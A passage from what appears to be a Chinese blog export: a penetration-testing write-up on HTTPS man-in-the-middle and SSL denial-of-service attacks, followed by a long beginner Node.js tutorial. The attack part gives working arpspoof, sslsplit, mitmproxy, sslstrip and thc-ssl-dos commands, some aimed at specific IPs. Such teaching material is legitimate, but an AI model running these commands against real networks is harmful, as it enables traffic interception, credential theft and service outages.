#POP3S\n#其他使用ssl协议加密的协议端口一样\n\niptables -L\n\n```\n\n**3).ARP欺骗**\n```bash\n# -i本地网卡 -t要欺骗的目标， -r:让他认为网关192.168.1.1的mac地址是我本机的mac地址\narpspoof -i eth0 -t 192.168.1.118 -r 192.168.1.1\n\n#可以发现：受害者机器上关于网关的mac已经换成了kali的\n```\n\n**4).启动SSLsplit**\n```bash\nmkdir -p test/logdir\n\n# -D:debug显示详细信息，-l把连接信息记录到哪，-j“越狱”的根目录(sslsplit的)，-S请求具体数据内容保存的目录，-k私钥，-c证书；对ssl加密的在本地8443监听,对明文在本地8080监听\nsslsplit -D -l connect.log -j /root/test -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080\n\n# 所有操作完成了\n```\n- 然后让被害者访问https的一些网站(会显示证书有问题,是否继续浏览)  \n- 我们可以查看日志和浏览器证书以及证书保存信息(`cat connect.log`) ,\n- 具体通信数据在:`ls test/logdir`, 每个log文件中内容会有被解密的明文信息（如果还有加密信息,那就是应用程序本身进行了加密的，这里的解密的只是通信过程中针对ssl部分）\n  通过关键词查找内容：`grep xxx *.log`这样\n- 在受害者机器上安装我们生成的服务器根证书之后再次访问(浏览器就不会弹出警告了)\n\n\n\n>全站https/非全站https（比如只是登录等部分页面加了https）\n\n\n\n###### 2.`Mitmproxy`工具\n\n- 设置路由表转发规则\n\n```bash\n# bug: 只能在8080端口监听，所以需要修改规则\niptables -t nat -F\n\niptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIFECT --to-port 8080\niptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIFECT --to-port 8080\n```\n\n- 也是使用`arpspoof`进行arp欺骗\n\n```bash\narpspoof -i eth0 -t 192.168.1.118 -r 192.168.1.1\n```\n\n- 最后，Mitmproxy侦听\n\n```\nmitmproxy -T --host -w mitmproxy.log\n\n# mitmproxy会自动生成一个证书\n```\n\n\n\n###### 3.`SSLstrip`工具\n\n与前两种工具不同，此工具将客户端到中间人之间的流量变为明文(不用通过安装证书)\n```bash\n# 这种更实用便捷，但是......\nsslstrip -l 8080\n```\n\n\n\n----------\n\n\n\n## SSL/TLS拒绝服务攻击\n\n>和流量式的拒绝服务攻击不同(打击的是网络带宽)，而我们这里打击的是服务器的资源\n\n\n\n#### Note:\n\n- SSL协商加密，服务器资源加载速度会变慢（大量握手请求会导致拒绝服务），但是优化得当就可以没问题\n- 利用SSL secure Renegotiation特性，在单一TCP连接中生成数千个SSL重连接请求，造成服务器资源过载\n- 与流量式的拒绝服务攻击不同，thc-ssl-dos可利用dsl线路打垮30G带宽的服务器\n- 服务器平均可以处理300次/s SSL握手请求\n\n\n\n#### 利用\n\n##### `thc-ssl-dos`工具\n```bash\n#使用\nthc-ssl-dos 199.223.209.205 2083 -accept\n```\n\n\n> `dig`命令，解析ip地址\n\n\n\n\n\n\n\n----------\n\n\n\n## 补充概念\n\n#### Ajax\n\nAsynchronous JavaScript and XML\n\n是一组现有技术的组合\n\n通过客户端脚本动态更新页面部分内容，而非整个页面   \n\n降低带宽使用，提高速度\n\n提升用户体验\n\n后台异步访问\n\n\n\n**Ajax组件**\n\n- JavaScript(ajax的核心组件)\n- Dynamic HTML(DHTML) \n- DOM\n\n**ajax框架：**\n\n- jQuery\n- Dojo Tookit\n- Google Web toolkit\n- Microsoft Ajax library\n\n**基于Ajax的Web应用工作流程**\n\n\n![](http://image.xpshuai.cn/HTTPS%E6%94%BB%E5%87%BB_3.png)\n\n> 使用的技术混合越多，攻击面就越大(每个参数都可能形成独立的攻击过程)\n\n\n\n**Ajax的安全问题**\n\n- 多种技术混合，攻击面就越大(每个参数都可能形成独立的攻击过程)\n- Ajax引擎，访问恶意站点可能后果严重，虽然浏览器有沙箱和SOP，但可能被绕过\n- 服务器、客户端代码结合使用产生混乱，服务器访问控制不当，将信息泄露\n- 暴露应用程序逻辑\n\n\n\n**Ajax对渗透测试的挑战**\n\n- 异步请求数量多且隐蔽\n\n- 触发Ajax请求的条件无规律\n\n- 手动和阶段大力爬网可能产生大量遗漏\n\n  \n\n**检查方法：**\n- 手动查看页面源代码有没有使用ajax（效率低一些）\n- 浏览器打开审查元素：net --> XHR  /   net --> javascript\n- 使用ZAP，使用ajax爬站功能\n\n\n\n\n\n\n#### Web Service\n- 面向服务的架构，便于不同系统集成共享数据和功能\n- 尤其适合不想暴露数据模型和程序逻辑而访问数据的场景\n- 无页面\n\n**两种类型：**\n\n- SOAP （传统，xml是唯一的数据交换格式，繁琐，但是安全）  -- Simple object access protocol\n- RESTful (json是首选的数据交换格式刷)\n\n\n\n**web service安全考虑：**\n\n- 使用API key或session token实现和跟踪身份认证\n- 身份认证由服务器完成，而非客户端\n- API key, 用户名, Session token 永远不要通过URL发送\n- RESTful 不提供任何安全机制，需要使用SSL/TLS保护传输数据安全\n- SOAP提供强于HTTPS的WS-security机制\n- 使用OAuth或HMAC进行身份验证，HMAC身份认证使用C/S共享的秘钥加密API key\n- RESTful应只允许身份认证用户使用PUT、DELETE方法\n- 使用所及token防止CSRF攻击\n- 对用户提交参数过滤，建议部署基于严格白名单的方法\n- 报错信息消毒\n- 直接对象引用应严格身份验证(电商公司以ID作为主索引)\n\n\n","tags":["HTTPS攻击"],"categories":["渗透测试"]},{"title":"Node.js 入门","url":"%2Fposts%2F2238%2F","content":"\n\n\nNode.js是一个机遇Chrome V8引擎的JavaScript运行环境\n\nNode.js的包管理器npm，是全球最大的开源生态库系统\n\nNode.js可解析js代码，没有浏览器安全级别的限制\n\n\n\n## 一.开发环境配置\n\n官网： https://nodejs.org/en/\n\nAPI文档：http://nodejs.cn/api/events.html\n\n#### 如果需要安装多个版本\n\n**1).docker**\n\n**2).使用nvm来安装并维护（`推荐`）**\n\n项目地址：https://github.com/nvm-sh/nvm\n\n```bash\n# 1.安装nvm\ncurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.35.3/install.sh | bash\n\n# 2.配置环境变量\n#linux下  .bash_profile或.bash_rc\nexport NVM_DIR=\"$([ -z \"${XDG_CONFIG_HOME-}\" ] && printf %s \"${HOME}/.nvm\" || printf %s \"${XDG_CONFIG_HOME}/nvm\")\"\n[ -s \"$NVM_DIR/nvm.sh\" ] && \\. \"$NVM_DIR/nvm.sh\" # This loads nvm\n\n# windows系统。。。\n```\n\n3.配置加速镜像：\n\n```bash\n# 同样在上面的配置文件\nexport NVM_NODEJS_ORG_MIRROR=http://npm.taobao.org/mirrors/node\n```\n\n\n\n#### **安装node**\n\n```bash\n# 安装指定版本\nnvm install 8.0.0\n\n# 或安装最新的稳定版本\nnvm install --lts\n\n# 或安装最新的版本\nnvm install node\n\n# 查看安装的版本\nnvm ls\n\n# 查看当前版本\nnode -v\n\n# 切换版本\nnvm use 6.11.2\n```\n\n\n\n#### 体验一下\n\n在终端进入node命令行：`node`, 之后可以输入js代码了\n\n在终端里面，不用受到浏览器里面的一些限制(但是本地环境没有`dom`和`bom`的操作)\n\n比如，查看本地进程`process`\n\n执行文件：`node index.js`\n\n\n\n###### 不用每次写完都运行命令来执行\n\n安装`nodemon`, 实时侦测文件的变化\n\n```bash\nnpm install nodemon -g  # 全局安装\n```\n\nnpm使用国内源：\n\n```bash\n# 永久\nnpm config set registry https://registry.npm.taobao.org\n```\n\n或安装使用`cnpm`命令\n\n使用`nodemon`：\n\n```bash\nnodemon index.js\n# 这样就可以实时侦测了\n```\n\n\n\n使用其他版本node来运行脚本\n\n```bash\n# 1.指定版本来运行\nnvm run 6.1.2 index.js\n\n\n#2.使用配置文件\n.nvmrc \n#内容直接写版本号，\n6.1.2\n#\nnmp use\n#接下来运行就可以了\nnode index.js\n```\n\n\n\n## 二. 模块(包)与CommonJS\n\n![](http://image.xpshuai.cn/commonjs.png)\n\n#### Node.js三种模块\n\n1. **内置的Node.js模块**\n\n   ```javascript\n   const os = require('os')  // require 载入模块\n   console.log(os.hostname()); // 显示主机名\n   ```\n\n   \n\n2. **第三方的Node.js模块**(https://www.npmjs.com)\n\n   ​\t把包用npm引进来（可以创建配置文件来管理`npm init `,根据情况填写回撤，会自动创建`package.json`）\n\n   ​    在命令行输入`npm install request  --save` 安装在配置信息的依赖`dependencies`里\n\n   ​    会在我们的包里面自动创建一个文件夹`node_modules`, 我们安装的包就会在里面了\n\n   ​\t载入模块同上\n\n   ​\t然后开始使用第三方模块\n\n   ```javascript\n   const request = require('request')  //自动先从自己的模块找，找不到就会到我们目录下配置文件夹下找\n   \n   request({\n     url: 'https://api.douban.com/v2/movies/top250',\n     json:true,\n   }, (error, response, body) => {\n     console.log(JSON.stringfy(body, null, 2));\n   \n   });\n   \n   ```\n\n   \n\n3. **自定义的Node.js模块（要按照CommonJS规范）**\n\n   新建一个目录`src`,里面新建一个js文件(模块)\n\n   ```javascript\n   //自定义模块\n   const hello = () =>{\n     console.log(\"hello~\");\n   }\n   \n   //暴露接口供外部使用(第一个hello是模块的名字，第二个hello是要用的方法)\n   module.exports.hello = hello\n   ```\n\n   调用\n\n   ```javascript\n   const greet = require(\"./src/greeting.js\")\n   greet.hello()\n   ```\n\n   \n\n\n\n## 三. NPM-包管理工具\n\n#### npm使用\n\n```bash\nnpm -v\nnpm info\n```\n\n\n\n**镜像源**\n\n```bash\n# 查看\nnpm config get registry\n\n# 设置\nnpm config set registry http://registry.npmjs.org \n```\n\n\n\n**升级node**\n\n```bash\n#\nnpm install n -g   \n```\n\n\n\n**查看当前目录下安装了哪些node包**\n\n```bash\nnpm ls\n```\n\n**查看当前npm用户**\n\n```bash\nnpm whoami\n```\n\n**npm清理缓存**\n\n```bash\nnpm cache clean -f\n\n```\n\n\n\n**npm安装模块**\n\n```bash\n# i = install\nnpm i forever -g  # 全局\n\nnpm install xxx   # 利用 npm 安装xxx模块到当前命令行所在目录；\nnpm install -g xxx  # 利用npm安装全局模块xxx；\nnpm install xxx  # 安装但不写入package.json；\nnpm install xxx –save  # 安装并写入package.json的”dependencies”中；\nnpm install xxx –save-dev # 安装并写入package.json的”devDependencies”中。\n```\n\n**npm 删除模块**\n\n```bash\nnpm uninstall xxx     # 删除xxx模块；\nnpm uninstall -g xxx  # 删除全局模块xxx；\n```\n\n\n\n**更新模块**\n\n```\nnpm update \n```\n\n**检查模块是否已经过时**\n\n```bash\nnpm outdated\n```\n\n在项目中引导创建一个package.json文件\n\n```bash\nnpm init\n```\n\n 发布模块\n\n```bash\nnpm publish\n```\n\n查看node安装路径\n\n```bash\n查看node安装路径\n```\n\n\n\n**npm scripts**\n\n配置文件中\n\n```json\n  \"scripts\": {\n    \"test\": \"echo \\\"Error: no test sspecified\\\" && exit 1\"\n    \"build\": \"node async.js\"\n  },\n```\n\n按照上面配置完之后，运行只需：`npm run build`\n\n优点：\n\n- 功能相同，可以使用同一个脚本\n\n详细的下来查文档\n\n\n\n## 四.深入浅出Node核心模块API\n\n#### 1). url\n\n> 记得要导入模块\n\n###### 1.parse\n\n`url.parse(urlStr, [parseQueryString], [slashesDenoteHost])`\n\n```javascript\nurl.parse(\"https://www.baidu.com\")\n# 井号后面是hash\nurl.parse(\"https://www.baidu.com:8080/api.php?from=xp&course=node#level\")\n\n#第二个参数 parseQueryString 为true时将使用查询模块分析查询字符串，默认为false\nurl.parse(\"https://www.baidu.com\"， true)\n#第三个参数 如果设置成true，//foo/bar 形式的字符串将被解释成 { host: ‘foo', pathname: ‘/bar' }\nurl.parse(\"https://www.baidu.com\"， true,true)\n```\n\n###### 2.format\n\n将一个解析后的URL对象、转成、一个格式化的URL字符串。\n\n`url.format(urlObj)`\n\n```javascript\nvar url = require('url');\n \nvar a = url.format({\nprotocol : 'http' ,\nauth : null ,\nhost : 'example.com:8080' ,\nport : '8080' ,\nhostname : 'example.com' ,\nhash : null ,\nsearch : '?a=index&t=article&m=default',\nquery : 'a=index&t=article&m=default',\npathname : '/one',\npath : '/one?a=index&t=article&m=default',\nhref : 'http://example.com:8080/one?a=index&t=article&m=default'\n});\nconsole.log(a);\n \n//输出结果：http://example.com:8080/one?a=index&t=article&m=default\n```\n\n\n\n###### 3.resolve\n\n为URL或 href 插入 或 替换原有的标签，两段解析成一个完整的url\n\n`url.resolve(from, to)`\n\n```javascript\nvar url = require('url');\nvar a = url.resolve('/one/two/three', 'four') ,\nb = url.resolve('http://example.com/', '/one'),\nc = url.resolve('http://example.com/one', '/two');\nconsole.log(a +\",\"+ b +\",\"+ c);\n//输出结果：\n///one/two/four\n//http://example.com/one\n//http://example.com/two\n```\n\n\n\n#### 2). QueryString\n\n###### 1.querystring.escape(str)\n\n转义为url编码\n\n```javascript\nquerystring.escape('<大家好>')\n```\n\n###### 2.querystring.unescape(str)\n\n反转义\n\n```javascript\nquerystring.unescape('%3C%E5%A4%A7%E5%AE%B6%E5%A5%BD%3E')\n```\n\n\n\n###### 3.querystring.stringify(obj,[, seq[, eq[, options]]])\n\n序列化\n\n```javascript\n1.  querystring.stringify({name:'chenshuai',ago:21,job:\"web\"})\n2.   querystring.stringify({name:'chenshuai',ago:21,job:\"web\"},\".\") //第二个参数可以修改连接的&\n\n3. querystring.stringify({name:'chenshuai',ago:21,job:\"web\"},\".\",\":\")//第三个参数可以修改key与value之间的字符串\n\n```\n\n\n\n###### 4.querystring.parse(str[, sep[, eq[, options]]])\n\n反序列化\n\n```javascript\n// querystring.parse('字符串','&','=') //默认状态(字符串,分隔符,键与值)\n1. querystring.parse('name=chenshuai&ago=21&job=web')\n\n2.querystring.parse('name=chenshuai.ago=21.job=web','.')//返序列化时要注意格式\n\n3.querystring.parse('name:chenshuai.ago:21.job:web','.',':')\n```\n\n\n\n#### 3).http(s) 模块\n\n###### 1.get方法\n\n案例，http小爬虫\n\n```javascript\nvar http = require('http')\nvar https = require('https') //https网站使用(和http的方法是一样的)\nvar cherio = require('cherio') // 类似于jQuery\nvar url = \"https://www.lagou.com\"\n\n// 解析源代码\nfunction parseMenu(html){\n  //先导入html，然后再进行处理\n  var $ = cherio.load(html)\n  var menu = $('.category-list')\n  var menuData = []\n  menu.each(function(index,value){ //遍历\n    var menuTitle = $(value).find('h2').text() //一级标题\n    var menuLists = $(value).find('a')\n    var menuList = []\n    menuLists.each(function(inde, val){ //遍历\n      menuList.push($(val).text())  //a元素的text\n    })\n    menuData.push({\n      menuTitle:menuTitle,\n      menuList:menuList\n    })\n  })\n  return menuData\n}\n\n//打印\nfunction printMenu(menu)\n{\n  menu.forEach(function(val){\n    console.log(val.menuTitle + '\\n');\n    val.menuList.forEach(function(value){\n      console.log(value);\n    })\n  })\n\n}\n\n// get请求\nhttps.get(url, function(res){\n  var html = '';\n  res.on('data', function(data){\n    html += data;\n  })\n\n  res.on('end', function(){\n    // 打印的是网页源代码\n    //console.log(html);\n    var result = parseMenu(html)\n    printMenu(result)\n\n  })\n\n  res.on('error', function(err){\n    console.log(err);\n  })\n})\n\n```\n\n\n\n###### 2.Request方法\n\nGET获取异步数据\n\n```javascript\n//Http模块的request方法的get来获取异步数据 豆瓣电影Top250\nconst https = require('https')\n\nvar options = {\n  hostname: 'douban.uieee.com',\n  port: 443,\n  method: 'GET',\n  path: '/v2/movie/top250'\n}\n\nvar responseData = ''\nvar request = https.request(options, (response) =>{\n  response.setEncoding('utf8')\n  response.on('data', (chunk)=>{\n    responseData += chunk\n  })\n  response.on('end',()=>{\n    JSON.parse(responseData).subjects.map((item) =>{\n      console.log(item.title); // 第一页的电影标题\n    })\n  })\n})\n\nrequest.on('error', (error)=>{\n  console.log(error);\n})\n\nrequest.end()\n\n```\n\nPOST方法提交表单\n\n```javascript\n//Http模块的request方法的post方法提交表单\nconst http = require('http')\nconst qs = require('querystring')\n\n//序列化\nvar postData = querystring.stringfy({\n  'question[title]':'哈哈哈',\n  'question[content]':'我的内容'\n})\n\nvar options = {\n  hostname: 'www.codingke.com',\n  port: 80,\n  method: 'POST',\n  path: '/ajax/course/question'\n  headers: {  // 因为登录之后才能提交，所有这里...\n    'Cookie':'xxxx',\n    'User-Agent':'xxxx',\n    'xxx':'xxx',\n    'Content-Length':postData.length\n  }\n}\n\n\nvar request = http.request(options, (res) =>{\n  console.log('Status:' + res.statusCode);\n  res.setEncoding('utf8')\n  res.on('data', (chunk)=>{\n      console.log(chunk);\n  })\n\n  res.on('end',()=>{\n    console.log(\"表单提交完毕\");\n  })\n})\n\n//提交表单\nrequest.write(postData)\n\n\nrequest.on('error', (error)=>{\n  console.log(error);\n})\n\nrequest.end()\n\n```\n\n\n\n#### 4).  Events事件模块\n\n使用事件: `EventEmitter`类\n\n事件的参数\n\n只执行一个的事件监听器\n\n比如：更新、发布 都是一个事件\n\n\n\n小例子:\n\n```javascript\nconst EventEmitter = require('events')\n\nclass Player extends EventEmitter{}  //继承类\n//实例化对象\nvar player = new Player()\n\n//自定义一个函数(不过我这里是用的匿名函数)\nfunction ev1(){\n    console.log(\"嘻嘻\");\n}\n\n//监听事件(这里用的匿名函数)\nplayer.on('play', (track)=>{\n  console.log(`正在播放: 《${track}》`);\n})\n\n// emit订阅事件，传递参数\nplayer.emit('play',\"被风吹过的夏天\")\n//事件定义之后，可以多次触发\nplayer.emit('play',\"朋友请听好\")\n\n// once 不论你定义几次，只会触发一次\nplayer.once('play',\"陈情令\")\n\n// removeListener 移除指定的监听事件\n//player.removeListener('')\n\n\n// removeAllListeners    移除所有的监听事件\n\n// eventNames方法可以罗列出已注册的所有监听器的事件，类型为数组\n\n```\n\n\n\n#### 5). fs 文件系统\n\n得到文件与目录信息：`stat`\n\n创建一个目录：`mkdir`\n\n创建文件并写入内容：`writeFile`,`appendFile`\n\n读取文件的内容：`readFile`\n\n列出目录的东西：`readdir`\n\n重命名目录或文件：`rename`\n\n删除目录与文件：`rndir`,`unlink`\n\n```javascript\nconst fs = require('fs')\n\nfs.stat('index.js', (error,stats) => {\n  if(error){\n    console.log(error);\n  }else{\n    console.log(stats);  //打印文件的一些信息\n    console.log(`文件：${stats.isFile()}`);\n    console.log(`目录：${stats.isDirectory()}`);\n  }\n})\n\n\n//新建目录\nfs.mkdir('logs' (error) =>{\n  if(error){\n    console.log(error);\n  }else{\n    console.log(\"成功创建目录: logs\");\n  }\n})\n\n// 往文件写内容(如果文件不存在，就先创建)\nfs.writeFile('logs/hello.log', \"hello ~\\n\" , (error) =>{\n  if(error){\n    console.log(error);\n  }else{\n    console.log(\"成功向文件logs/hello.log写入内容 \");\n  }\n})\n\n// 修改文件内容\nfs.writeFile('logs/hello.log', \"你好 ~\\n\" , (error) =>{\n  if(error){\n    console.log(error);\n  }else{\n    console.log(\"成功修改文件logs/hello.log内容 \");\n  }\n})\n\n// 追加文件内容\nfs.appendFile('logs/hello.log', \"新添加的一行 ~\\n\" , (error) =>{\n  if(error){\n    console.log(error);\n  }else{\n    console.log(\"成功添加内容文件logs/hello.log \");\n  }\n})\n\n// 读取文件内容\nfs.readdFile('logs/hello.log','utf8', (error,data) =>{\n  if(error){\n    console.log(error);\n  }else{\n    console.log(\"成功读取文件logs/hello.log内容\");\n    console.log(data);\n    //console.log(data.toString());\n  }\n})\n\n\n// 读取文件夹列表\nfs.readdir('logs/', (error,data) =>{\n  if(error){\n    console.log(error);\n  }else{\n    console.log(\"成功读取文件夹logs/列表 \");\n    console.log(data);\n    //console.log(data.toString());\n  }\n})\n\n//对文件重命名  、修改文件夹名字一样\nfs.rename('logs/hello.log', \"logs/hello_new.log\" , (error) =>{\n  if(error){\n    console.log(error);\n  }else{\n    console.log('重命名文件名logs/hello.log \");\n  }\n})\n\n//循环删除文件\nfs.readdirSync('logs').map((file) =>{\n  fs.unlink(`logs/${file}`, (error) =>{\n    if(error){\n      console.log(error);\n    }else{\n      console.log(`成功删除文件logs/${file}`);\n    }\n  })\n})\n\n\n\n//删除文件夹\nfs.rmdir('logs',  (error) =>{\n  if(error){\n    console.log(error);\n  }else{\n    console.log('成功删除目录:logs/ \");\n  }\n})\n\n```\n\n\n\n#### 6). Stream\n\n文件流\n\n```javascript\nconst fs = require('fs')\n\nvar fileReadStrem = fs.createReadStream('data.json')\nvar fileWriteStrem = fs.createWriteStream('data1.json')\n\nvar count = 0;\n\n//读取文件流\nfileReadStrem.once('data', (chunk) => {\n  console.log(chunk.toString());\n})\n\nfileReadStrem.on('data', (chunk) => {\n  console.log(`${ ++count } 接收到：${chunk.length}`);\n  //写入文件流\n  fileWriteStrem.write(chunk)\n})\n\nfileReadStrem.on('end', () => {\n  console.log(\"-- 结束  --\");\n})\n\nfileReadStrem.on('error', (error) => {\n  console.log(error);\n})\n\n```\n\npipe \n\n```javascript\nconst fs = require('fs')\nconst zlib = require('zlib')\n\nvar fileReadStrem = fs.createReadStream('data.json')\nvar fileWriteStrem = fs.createWriteStream('data1.json')\n\nfileWriteStrem.on('pipe', (source) => {\n  console.log(source); //将写入的内容通过管道打印一下\n})\n\n//读取文件流的内容放到文件写入流   管道\nfileReadStrem\n  .pipe(zlib.createGzib())\n  .pipe(fileWriteStrem)\n\n```\n\n\n\n\n\n## 五.使用Node创建后端路由\n\n**使用supervisor运行**\n\n```bash\n# 安装：\nnpm install supervisor -g\n\n# 运行\nsupervisor router_1.js\n```\n\n\n\n**最简单路由**\n\nrouter_1.js\n\n```javascript\nvar http = require('http')\nvar url = require('url')\n\nvar route = require('./modules/route.js')\n\nhttp.createServer((req, res) => {\n  res.writeHead(200, {'Content-Type':'text/html;charset=utf-8'})\n  if(req.url !== '/favicon.ico'){\n    var pathName = url.parse(req.url).pathname.replace(/\\//,'') //http://localhost:8000/login就是login\n    console.log(pathName);\n    try{  //最简单的异常处理\n      route[pathName](req, res)\n    } catch(err){\n      route['home'](req, res)  //默认路由，如果不存在哪个路由，就返回这个路由\n    }\n\n  }\n  res.end()\n}).listen(8000)\n\nconsole.log('Server running at http://localhost:8000');\n\n```\n\nroute.js\n\n```javascript\nmodule.exports = {\n  home: (req, res) => {\n    res.write(\"欢迎来到首页\")  // 默认路由\n  },\n  login: (req, res) => {\n    res.write(\"登录界面\")  // 处理路由\n  },\n  registor: (req, res) => {\n    res.write(\"注册界面\")  // 处理路由\n  }\n}\n\n```\n\n\n\n**读取图片**\n\nrouter_02.js\n\n```javascript\nvar http = require('http')\nvar url = require('url')\n\nvar route = require('./modules/route.js')\n\nhttp.createServer((req, res) => {\n  res.writeHead(200, {'Content-Type':'image/jpeg'})\n  if(req.url !== '/favicon.ico'){\n    var pathName = url.parse(req.url).pathname.replace(/\\//,'') //http://localhost:8000/login就是login\n    console.log(pathName);\n    try{  //最简单的异常处理\n      route[pathName](req, res)\n    } catch(err){\n      route['home'](req, res)  //默认路由，如果不存在哪个路由，就返回这个路由\n    }\n\n  }\n  //res.end()\n}).listen(8000)\n\nconsole.log('Server running at http://localhost:8000');\n\n```\n\nroute.js\n\n```javascript\nvar file = require('./file.js')\n\nmodule.exports = {\n  home: (req, res) => {\n    res.write(\"欢迎来到首页\")  // 默认路由\n  },\n  login: (req, res) => {\n    res.write(\"登录界面\")  // 处理路由\n  },\n  registor: (req, res) => {\n    res.write(\"注册界面\")  // 处理路由\n  },\n  img: (req, res) => {\n    //读取文件，也新建一个模块\n    file.readImg('./images/1.jpg', res)\n  }\n}\n```\n\nfile.js\n\n```javascript\nvar fs = require('fs')\n\nmodule.exports = {\n  readImg: (file, res) => {\n    fs.readFile(file, 'binary', (err, data) => {\n      if(err) throw err;\n      res.writeHead(200, {'Content-Type':'image/jpeg'})\n      res.write(data, 'binary')\n      res.end()\n    })\n  }\n}\n\n```\n\n\n\n**文字和图片一起显示**\n\n使用html文件\n\nviews/home.html\n\n```html\n<!<!DOCTYPE html>\n<html>\n  <head>\n    <meta charset=\"utf-8\">\n    <title>首页</title>\n  </head>\n  <body>\n    首页\n    <img src=\"./img\" alt=\"\">\n  </body>\n</html>\n\n```\n\nfile.js\n\n```javascript\nvar fs = require('fs')\n\n //读html文件\nmodule.exports = {\n  readFile: (file, res) => { \n    fs.readFile(file, 'utf-8', (err, data) => {\n        if(err) throw err;\n          res.writeHead(200, {'Content-Type':'text/html; charset=utf-8'})\n          res.write(data)\n          res.end()\n  })},\n  readImg: (file, res) => {\n    fs.readFile(file, 'binary', (err, data) => {\n      if(err) throw err;\n      res.writeHead(200, {'Content-Type':'image/jpeg'})\n      res.write(data, 'binary')\n      res.end()\n    })\n  }\n}\n\n```\n\n\n\nroute.js\n\n```javascript\nvar file = require('./file.js')\n\nmodule.exports = {\n  home: (req, res) => {\n    //res.write(\"欢迎来到首页\")  // 默认路由\n    file.readFile('./views/home.html', res)\n\n  },\n  login: (req, res) => {\n    res.write(\"登录界面\")  // 处理路由\n  },\n  registor: (req, res) => {\n    res.write(\"注册界面\")  // 处理路由\n  },\n  img: (req, res) => {\n    //读取文件，也新建一个模块\n    file.readImg('./images/1.jpg', res)\n  }\n}\n\n```\n\nrouter_03.js\n\n```javascript\nvar http = require('http')\nvar url = require('url')\n\nvar route = require('./modules/route.js')\n\nhttp.createServer((req, res) => {\n  if(req.url !== '/favicon.ico'){\n    var pathName = url.parse(req.url).pathname.replace(/\\//,'')\n    console.log(pathName);\n    try{  //最简单的异常处理\n      route[pathName](req, res)\n    } catch(err){\n      route['home'](req, res)  //默认路由，如果不存在哪个路由，就返回这个路由\n    }\n\n  }\n  //res.end()\n}).listen(8000)\n\nconsole.log('Server running at http://localhost:8000');\n\n```\n\n\n\n###### 路由传递参数\n\n**1.get方式**\n\nlogin.html\n\n```html\n    <form action=\"./login\" method=\"get\">\n      <label for=\"email\">\n        邮箱: <input type=\"text\" name=\"email\" value=\"\"/>\n      </label>\n      <label for=\"password\">\n        密码: <input type=\"password\" name=\"password\" value=\"\"/>\n      </label>\n      <label for=\"submit\">\n        <input type=\"submit\" value=\"提交\" />\n      </label>\n```\n\ntoute.js\n\n```javascript\nvar file = require('./file.js')\nvar url = require('url')\n\nmodule.exports = {\n  login: (req, res) => {\n    var urlObject = url.parse(req.url, true).query  // 通过url解析html表单数据\n    console.log(urlObject.email)\n    console.log(urlObject.password)\n    file.readFile('./views/login.html', res, req)\n  }\n}\n\n\n```\n\n**2.post方式**\n\nroute.js\n\n```javascript\n\nvar file = require('./file.js')\nvar url = require('url')\nvar queryString = require('queryString')\n\n\nmodule.exports = {\n  login: (req, res) => {\n    //post方式\n    var post = ''\n    req.on('data', (chunk) => {\n      post += chunk\n    })\n    req.on('end', () => {\n      var urlObject = queryString.parse(post) //返回一个url对象\n      console.log(urlObject.email);\n      console.log(urlObject.password);\n    })\n    file.readFile('./views/login.html', res, req)\n  }\n}\n\n```\n\n\n\n**输入的内容回显到本页面**\n\nfile.js\t\n\n```javascript\n  postReadFile:  (file, res, req, post) =>{\n    var urlObject = queryString.parse(post)\n    var array = ['email', 'password']\n    var reg;\n\n    fs.readFile(file, 'utf-8', (err, data) => {\n        if(err) throw err;\n          res.writeHead(200, {'Content-Type':'text/html; charset=utf-8'})\n          //处理\n          for(var i=0; i<array.length; i++){\n            reg = new RegExp('{' + array[i] + '}', 'gi')\n            data = data.replace(reg, urlObject[array[i]])\n          }\n          if(urlObject.email && urlObject.password){\n            data = data.replace(new RegExp('{infoClass}', 'gi'), '')\n            data = data.replace(new RegExp('{formClass}', 'gi'), 'hide')\n          }else{\n            data = data.replace(new RegExp('{infoClass}', 'gi'), 'hide')\n            data = data.replace(new RegExp('{formClass}', 'gi'), '')\n          }\n          res.write(data)\n          res.end()\n        })\n},\n```\n\nroute.js\n\n```javascript\n  login: (req, res) => {\n    //post方式\n    var post = '';\n    req.on('data', (chunk) => {\n      post += chunk\n    })\n    req.on('end', () => {\n      file.postReadFile('./views/login.html', res, req, post)\n    })\n  },\n```\n\nlogin.html\n\n```html\n    <div class=\"{infoClass}\">\n      Email:{email} <br>\n      密码:{password}\n    </div>\n    <form action=\"./login\" method=\"post\" class=\"formClass\">\n      <label for=\"email\">\n        邮箱: <input type=\"text\" name=\"email\" value=\"\"/>\n      </label>\n      <label for=\"password\">\n        密码: <input type=\"password\" name=\"password\" value=\"\"/>\n      </label>\n      <label for=\"submit\">\n        <input type=\"submit\" value=\"提交\" />\n      </label>\n```\n\n\n\n#### async\n\n`npm install async -D`\n\n常用功能:\n\n```javascript\n//1.串行无关联(第一个参数是数组，第二个参数是个回调函数)\n//运行时间是两个运行时间总和\nconsole.time('test')\nasync.series([\n  (callback) => { //数组的第一个元素\n    setTimeout(()=>{\n      callback(null,'one')\n    },200)\n  },\n  (callback)=>{ //数组的第一个元素\n    setTimeout(()=>{\n      callback(null,'two')\n    },5000)\n  }\n],\n(err, results) => {  // 第二个参数\n  console.log(results);\n  console.timeEnd('test') //看一下执行时间\n}\n)\n```\n\n```javascript\n// 2.串行无关联(第二种用法，第一个参数是对象)\nconsole.time('test')\nasync.series({\n  one: (callback) => {\n    setTimeout(() => {\n      callback(null, '1')\n    },2000)\n  },\n  two: (callback) => {\n    setTimeout(() => {\n      callback(null, '2')\n    ,3000)\n  }\n  }, (err, results) => {\n    console.log(results);\n    console.timeEnd('test')\n})\n```\n\n```javascript\n// 3.并行无关联（第一个参数是数组）\n//时间取最长的\nasync.parallel([\n  (callback) => {\n    setTimeout( ()=>{\n      callback(null, 'one')\n    },2000)\n  },\n  (callback) => {\n    setTimeout( ()=>{\n      callback(null, 'two')\n    },5000)\n  },\n], (err,results)=>{\n  console.log(results);\n  console.timeEnd('test')   //运行时间5s，取最长的\n})\n//也可以第一个参数是对象\n```\n\n```javascript\n// 4.串行有关联\nasync.waterfall([\n  function (callback){\n    callback(null,'one','two')\n  },\n  function (arr1,arr2,callback){\n    callback(null, arr1,arr2,'three')\n  },\n  function (arr1,arr2,arr3,callback){\n    callback(null, [arr1,arr2,arr3,'done'])\n  }\n],function(err,results){\n  